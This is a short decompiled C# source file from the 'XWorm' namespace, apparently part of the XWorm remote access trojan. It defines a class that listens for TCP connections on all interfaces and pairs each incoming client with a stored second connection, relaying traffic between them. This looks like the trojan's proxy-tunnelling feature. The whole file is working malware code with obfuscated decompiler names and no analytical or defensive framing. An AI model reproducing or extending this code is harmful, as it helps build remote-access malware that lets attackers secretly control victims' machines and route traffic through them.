using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

public class GClass6
{
	private static TcpListener tcpListener_0;

	private string remoteIP;

	public string key;

	public TcpClient tcpClient_0;

	public TcpClient tcpClient_1;

	private static bool bool_0;

	public GClass6(int localport, string remoteIP, string key)
	{
		bool_0 = true;
		try
		{
			this.key = key;
			tcpListener_0 = new TcpListener(IPAddress.Any, localport);
			tcpListener_0.Start(20);
			this.remoteIP = remoteIP;
			new Thread(method_0).Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			smethod_0();
			ProjectData.ClearProjectError();
		}
	}

	private void method_0()
	{
		try
		{
			while (bool_0)
			{
				TcpClient tcpClient = tcpListener_0.AcceptTcpClient();
				while (tcpClient_0 == null)
				{
					Thread.Sleep(100);
				}
				TcpClient tcpClient2 = tcpClient_0;
				tcpClient_0 = null;
				new Class0().method_0(tcpClient, tcpClient2);
				tcpClient_1 = tcpClient2;
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_0()
	{
		try
		{
			tcpListener_0.Stop();
			bool_0 = false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}